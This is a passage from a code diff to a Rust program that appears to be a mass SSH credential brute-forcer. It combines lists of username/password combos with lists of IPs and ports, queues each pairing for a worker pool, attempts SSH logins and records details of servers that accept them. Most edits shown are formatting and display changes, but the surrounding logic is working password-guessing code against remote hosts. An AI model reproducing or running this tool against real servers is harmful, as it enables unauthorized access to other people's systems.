     screen.show_cursor();
     println!();
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Worker pool
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn calculate_optimal_buffers(max_workers: usize) -> usize {
     ((max_workers * CONCURRENT_PER_WORKER) as f64 * 1.5) as usize
 }
@@ -991,6 +1309,7 @@ fn calculate_optimal_buffers(max_workers: usize) -> usize {
 #[allow(clippy::too_many_arguments)]
 fn setup_enhanced_worker_pool(
     screen: Screen,
+    pal: Palette,
     combos: Vec<Vec<String>>,
     ips: Vec<Vec<String>>,
     max_workers: usize,
@@ -1007,18 +1326,13 @@ fn setup_enhanced_worker_pool(
 
     let stop_flag = Arc::new(AtomicBool::new(false));
 
-    // Derive output dir path for banner display
-    let output_dir = outputs
-        .combo
-        .parent()
-        .map(|p| p.to_path_buf())
-        .unwrap_or_else(|| PathBuf::from("."));
-
+    let output_dir = outputs.dir.clone();
     let banner_stats = stats.clone();
     let banner_stop = stop_flag.clone();
     let banner_handle = thread::spawn(move || {
         banner(
             screen,
+            pal,
             banner_stats,
             ip_file,
             output_dir,
@@ -1047,19 +1361,25 @@ fn setup_enhanced_worker_pool(
     let producer = thread::spawn(move || {
         for combo in combos.iter() {
             for ip in ips.iter() {
-                if ip.len() < 2 || combo.len() < 2 { continue; }
+                if ip.len() < 2 || combo.len() < 2 {
+                    continue;
+                }
                 let task = SshTask {
                     ip: ip[0].clone(),
                     port: ip[1].clone(),
                     username: combo[0].clone(),
                     password: combo[1].clone(),
                 };
-                if tx.send(task).is_err() { return; }
+                if tx.send(task).is_err() {
+                    return;
+                }
             }
         }
     });
 
-    for h in worker_handles { let _ = h.join(); }
+    for h in worker_handles {
+        let _ = h.join();
+    }
     let _ = producer.join();
 
     stop_flag.store(true, Ordering::Relaxed);
@@ -1075,7 +1395,9 @@ fn process_ssh_task(
 ) {
     let connection_start = Instant::now();
 
-    if let Some(sess) = ssh_connect(&task.ip, &task.port, &task.username, &task.password, timeout) {
+    if let Some(sess) =
+        ssh_connect(&task.ip, &task.port, &task.username, &task.password, timeout)
+    {
         let mut info = ServerInfo {
             ip: task.ip.clone(),
             port: task.port.clone(),
